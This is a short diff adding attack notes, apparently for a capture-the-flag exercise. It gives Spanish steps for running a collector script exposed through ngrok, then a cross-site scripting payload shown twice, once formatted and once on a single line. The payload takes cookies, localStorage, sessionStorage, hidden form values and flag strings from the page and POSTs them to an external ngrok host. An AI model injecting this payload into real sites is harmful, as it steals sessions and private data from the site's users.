@@ -1,0 +1,46 @@
+abrir terminal
+python3 collector.py
+
+
+abrir otra terminal
+ngrok http 8080
+
+
+<script>
+(function(){
+  function extractHiddenInputs() {
+    var inputs = document.querySelectorAll('input[type="hidden"]');
+    var data = {};
+    for (var i = 0; i < inputs.length; i++) {
+      var name = inputs[i].name || inputs[i].id || 'unnamed_' + i;
+      data[name] = inputs[i].value;
+    }
+    return data;
+  }
+
+  function extractFlags() {
+    var html = document.documentElement.innerHTML;
+    var matches = html.match(/flag\{.*?\}/gi);
+    return matches || [];
+  }
+
+  var payload = {
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    location: location.href,
+    htmlSnippet: document.documentElement.innerHTML.slice(0, 1000),
+    hiddenInputs: extractHiddenInputs(),
+    flags: extractFlags()
+  };
+
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://8819-190-189-49-12.ngrok-free.app/log", true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.send(JSON.stringify(payload));
+})();
+</script>
+
+
+
+<script> (function(){   function extractHiddenInputs() {     var inputs = document.querySelectorAll('input[type="hidden"]');     var data = {};     for (var i = 0; i < inputs.length; i++) {       var name = inputs[i].name || inputs[i].id || 'unnamed_' + i;       data[name] = inputs[i].value;     }     return data;   }    function extractFlags() {     var html = document.documentElement.innerHTML;     var matches = html.match(/flag\{.*?\}/gi);     return matches || [];   }    var payload = {     cookie: document.cookie,     localStorage: JSON.stringify(localStorage),     sessionStorage: JSON.stringify(sessionStorage),     location: location.href,     htmlSnippet: document.documentElement.innerHTML.slice(0, 1000),     hiddenInputs: extractHiddenInputs(),     flags: extractFlags()   };    var xhr = new XMLHttpRequest();   xhr.open("POST", "https://8819-190-189-49-12.ngrok-free.app/log", true);   xhr.setRequestHeader("Content-Type", "application/json");   xhr.send(JSON.stringify(payload)); })(); </script>
